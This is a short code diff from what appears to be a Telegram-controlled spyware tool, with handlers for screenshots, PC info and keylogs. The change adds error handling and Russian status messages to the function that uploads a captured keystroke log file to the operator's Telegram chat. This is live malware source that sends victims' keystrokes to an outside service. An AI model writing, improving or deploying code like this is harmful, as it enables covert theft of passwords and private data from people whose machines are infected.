@@ -106,8 +106,20 @@ def capture_pc(message):
 def keylogs(message):
     chat_id = message.chat.id
     bot.send_chat_action(chat_id, 'upload_document')
-    with open(log_file, "rb") as file:
-        bot.send_document(chat_id, file)
+    try:
+        with open(log_file, "rb") as file:
+            bot.send_document(chat_id, file)
+        error_message = f"ВЫПОЛНЕННО!!!"
+        bot.send_message(chat_id, error_message)
+    except FileNotFoundError as e:
+        error_message = f"ОШИБКА: Файл не найден"
+        bot.send_message(chat_id, error_message)
+    except PermissionError as e:
+        error_message = f"ОШИБКА: Недостаточно прав для доступа к файлу"
+        bot.send_message(chat_id, error_message)
+    except Exception as e:
+        error_message = f"ОШИБКА: {e}"
+        bot.send_message(chat_id, error_message)
 @bot.message_handler(commands=['pc_info'])
 def pc_info(message):
     chat_id = message.chat.id
